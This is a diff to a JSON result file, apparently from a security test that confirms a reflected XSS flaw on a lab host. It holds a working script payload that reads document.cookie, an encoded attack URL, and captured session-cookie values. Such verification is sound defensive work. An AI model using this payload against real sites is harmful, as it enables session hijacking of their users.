@@ -16,7 +16,7 @@
   "payload": "<script>document.title='XSS-CONFIRMED-'+document.cookie</script>",
   "payload_url": "http://vuln-target:3000/search?q=%3Cscript%3Edocument.title%3D'XSS-CONFIRMED-'%2Bdocument.cookie%3C%2Fscript%3E",
   "evidence": {
-    "title_after_payload": "XSS-CONFIRMED-connect.sid=s%3AXdwddLeSg9bi0Upxnkeql_JXY8kiEQdX.pKmC5MNJEpPKgwgErURkjsrimd2L8Za4bU%2B7qy1%2BKfw",
+    "title_after_payload": "XSS-CONFIRMED-connect.sid=s%3A6183oEp9Yzfaz1vcXgObsADyM0mYQFIb.7RTOOdC5H3vZFL5ZUGk15SZX3gJ2u47CByLC6NdLaPI",
     "executed": true
   },
   "negative_control": {
@@ -25,5 +25,5 @@
     "clean": true,
     "reflected": true
   },
-  "generated": "2026-10-27T02:31:28.804Z"
+  "generated": "2026-10-31T16:36:59.054Z"
 }
